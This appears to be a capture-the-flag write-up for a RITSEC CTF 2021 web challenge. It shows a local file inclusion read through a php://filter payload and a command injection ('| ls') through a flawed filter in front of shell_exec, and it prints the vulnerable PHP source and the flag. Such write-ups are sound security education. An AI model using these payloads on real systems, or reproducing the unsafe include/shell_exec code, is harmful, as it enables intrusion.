# DababyWeb

> Dababy wanted to share a message, but he seemed to put it too high up...
>
> 34.72.118.158:6284
>
> Author: Darkfowl

Index page's source code :

```html
<html
body, html{
height= 100%;
}

<div style ="background-image: url('/img/dababy.jpg')"
height= 100%;
background=size: cover;

>


<h1 style= color:black;font-size:40px;>
"Dababy has his secret message hidden somwhere, but how can we read it?"

<a href="fun.php">Dababy's Name Judgement</a>
<p></p>
<a href="fun1.php?file=suge">Dababy's Images</a>
</h1>
</html>
```

`fun.php` and `fun1.php` were the 2 things that caught my eyes

Accessing `http://34.72.118.158:6284/fun1.php?file=suge` gave me a weird message that I don't think was useful

![image-20210412123228677](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/RITSEC-CTF-2021/images/DababyWeb-1.png?raw=true)

I thought it was LFI so I tried to give it another file path and it worked

![image-20210412123319004](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/RITSEC-CTF-2021/images/DababyWeb-2.png?raw=true)

After looking around for a while for the system files, I didn't really find anything useful. So I tried reading the the source code of the 2 PHP files using base64 encoding. I decided to read `fun1.php`'s own content first :

```
34.72.118.158:6284/fun1.php?file=php://filter/read=convert.base64-encode/resource=fun1.php
```

It gave me the string as expected :

```
PD9waHAKJGZpbGUgPSAkX0dFVFsiZmlsZSJdOwppZihpc3NldCgkZmlsZSkpCnsKICAgICAgICBpbmNsdWRlKCRmaWxlKTsKfQplbHNlCnsKICAgICAgICBpbmNsdWRlKCJzdWdlIik7Cn0KPz4KCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Cmh0bWwsIGJvZHl7d2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsgcGFkZGluZzogMDsgbWFyZ2luOiAwfQpkaXZ7cG9zaXRpb246IGFic29sdXRlOyBwYWRkaW5nOiAwZW07IGJvcmRlcjogMXB4IHNvbGlkICMwMDB9CiNud3t0b3A6IDEwJTsgbGVmdDogMDsgcmlnaHQ6IDUwJTsgYm90dG9tOiA1MCV9CiNuZXt0b3A6IDA7IGxlZnQ6IDUwJTsgcmlnaHQ6IDA7IGJvdHRvbTogNTAlfQojc3d7dG9wOiA1MCU7IGxlZnQ6IDA7IHJpZ2h0OiA1MCU7IGJvdHRvbTogMH0KI3Nle3RvcDogNTAlOyBsZWZ0OiA1MCU7IHJpZ2h0OiAwOyBib3R0b206IDB9Cjwvc3R5bGU+Cgo8ZGl2IGlkPSJudyI+PGltZyBzcmM9Ii9pbWcvZGFiYWJ5NC5qcGciIHN0eWxlPSJ3aWR0aDoxMDAlO2hlaWdodDoxMDAlOyI+PC9kaXY+CjxkaXYgaWQ9Im5lIj48aW1nIHNyYz0iL2ltZy9kYWJhYnk1LmpwZyIgc3R5bGU9IndpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7Ij48L2Rpdj4KPGRpdiBpZD0ic3ciPjxpbWcgc3JjPSIvaW1nL2RhYmFieTYuanBnIiBzdHlsZT0id2lkdGg6MTAwJTpoZWlnaHQ6MTAwJTsiPjwvZGl2Pgo8ZGl2IGlkPSJzZSI+PGltZyBzcmM9Ii9pbWcvZGFiYWJ5Ny5wbmciIHN0eWxlPSJ3aWR0aDoxMDAlOmhlaWdodDoxMDAlOyI+PC9kaXY+Cg==
```

Decoding it we have the source code for `fun1.php`

```php
<?php
$file = $_GET["file"];
if(isset($file))
{
        include($file);
}
else
{
        include("suge");
}
?>
```

So we found nothing useful other than things that we already knew. I moved on to the 2nd file, applying the same process, I got the source code of `fun.php`

```html
<?php
session_start();
?>
<html
<div style="background-image: url('/img/dababy2.jpg')"
height= 100%;
background-size: cover;
<head>
  <title>DaBaby Cool Name Convertable</title>
</head>
<body>
    <p><form action="fun.php" method="get">
    <b>Enter a cool name:  </b>
    <p></p>
    <input type="text" name="string" value="Your name!">
    <input type="submit">
    <p></p>
    <b>Dababy's Response:  </b>
    </form>
    <?php
    session_start();
    $name = $_GET['string'];
    $_SESSION['count'] = !isset($_SESSION['count']) ? 0 : $_SESSION['count'];	   
    if (strlen($name) >= 40){
	echo "Dababy says that's a long name";
    }
    else
    { 
    if (strpos($name, 'ls') == false && (strpos($name, ';') !== false || strpos($name, '&') !== false || strpos($name, '|') !== false)) {

	 $_SESSION['count']++;
         if ($_SESSION['count'] == 1){
	 echo "Dababy say's no peaking";
	 }
	 if ($_SESSION['count'] == 2){
	 echo "Dababy said no peaking";	 
	 }
         if ($_SESSION['count'] >= 3){
		 echo '<img src="/img/dababy3.jpg" class="rating" title="Spook" alt="Spook" />';
	 }	 
    }
    else
    {
	if (strpos($name, 'secr3t') !== false){
		echo "Dababy say's no peaking";
	}
	else
	{
	$_SESSION['count'] = 0;
    	echo shell_exec('echo '.$_GET['string'].' | xargs /var/www/html/dababy.sh');
	}       
	}
    }
    ?>
    </p>
</body>
</html>
```

It looks like there's a kind of flaw characters filter on the line and it did not filter the `ls` string correctly :

```php
if (strpos($name, 'ls') == false && (strpos($name, ';') !== false || strpos($name, '&') !== false || strpos($name, '|') !== false))
```

That are supposed to protect website from Injection flaws, especially OS Command Injection on this line :

```php
echo shell_exec('echo '.$_GET['string'].' | xargs /var/www/html/dababy.sh');
```

Applying the same process of reading file content above, I read the `dababy.sh` file content and this is all I got :

```sh
echo "$1 Is a Cool Name Lesss Go!"
```

So OS Command Injection was the correct guess. Time to exploit the flaw, I tried to read the directory using `ls`, I tried a simple payload like `| ls` 

![image-20210412124915704](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/RITSEC-CTF-2021/images/DababyWeb-3.png?raw=true)

So we know it worked as the `dababy.sh` file was returned

I tried `| ls%20../` and it showed `flag.txt`

Accessing `34.72.118.158:6284/fun1.php?file=../flag` gave me the flag

![image-20210412124915704](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/RITSEC-CTF-2021/images/DababyWeb-4.png?raw=true)

Flag :

```
RS{J3TS0N_M4D3_4N0TH3R_0N3}
```